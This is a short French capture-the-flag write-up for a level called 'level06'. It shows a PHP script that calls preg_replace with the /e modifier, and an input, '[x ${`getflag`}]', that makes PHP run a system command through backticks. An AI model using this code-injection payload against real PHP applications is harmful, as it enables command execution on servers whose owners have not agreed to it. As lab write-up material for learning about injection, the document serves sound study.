## Level 06

### Analyse
On trouve un binaire level06 qui appelle un script PHP. Le script utilise preg_replace avec le modificateur /e :

```php
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

### Exploitation
En utilisant la syntaxe ${}, on peut forcer l'exécution de commandes système :

```bash
$ echo '[x ${`getflag`}]' > /tmp/exploit
$ ./level06 /tmp/exploit
```
L'interpréteur PHP (/e) exécute getflag.
